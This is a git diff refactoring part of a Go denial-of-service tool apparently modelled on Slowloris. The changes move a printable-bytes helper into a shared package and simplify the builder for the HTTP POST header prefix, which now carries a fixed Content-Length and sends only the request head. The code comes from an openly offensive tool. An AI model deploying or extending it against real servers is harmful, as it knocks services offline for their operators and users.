@@ -5,10 +5,9 @@ import (
 	"net"
 	"net/url"
 	"os"
-	"strconv"
 	"time"
-	"unicode"
 
+	"github.com/andrewflbarnes/snacks/pkg/strs"
 	"github.com/andrewflbarnes/snacks/pkg/udy"
 
 	"github.com/andrewflbarnes/snacks/internal/helper"
@@ -91,7 +90,7 @@ func Loris() {
 }
 
 func logExecutionDetails(execution string, prefix []byte) {
-	if isPrintable(prefix) {
+	if strs.IsPrintable(prefix) {
 		logger.Infof("Prefix:\n%s", prefix)
 	}
 	logger.WithFields(log.Fields{
@@ -104,18 +103,6 @@ func logExecutionDetails(execution string, prefix []byte) {
 		"maxConns":  *flagMax,
 		"header":    *flagHeader,
 	}).Info("Starting Loris attack")
-}
-
-func isPrintable(bytes []byte) bool {
-	for _, c := range string(bytes) {
-		if !unicode.IsPrint(c) &&
-			c != '\n' &&
-			c != '\r' &&
-			c != '\t' {
-			return false
-		}
-	}
-	return true
 }
 
 func executeOnce(l udy.Udy, prefix []byte) {
@@ -135,22 +122,14 @@ func executeOnce(l udy.Udy, prefix []byte) {
 }
 
 func getPayloadPrefix() []byte {
-	// if http...
-	return getHTTPPayload(http.Post, helper.ApplicationJsonPrefix)
-}
-
-func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
-	size := *flagSize
 	host := dest.Host
 	endpoint := dest.Path
-
-	contentTypePrefix := media.Prefix()
-	contentTypePrefixLen := len(contentTypePrefix)
+	verb := http.Post
 
 	headers := map[string]string{
-		"Content-Type":   media.Name(),
+		"Content-Type":   http.ApplicationJSON.String(),
 		"Accept":         "*/*",
-		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
+		"Content-Length": "1000",
 		"Host":           host,
 	}
 
@@ -162,7 +141,5 @@ func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
 		Headers:  headers,
 	}
 
-	// httpRequest := builder.BuildBytes()
-	// return append(httpRequest, contentTypePrefix...)
 	return []byte(builder.BuildHead())
 }
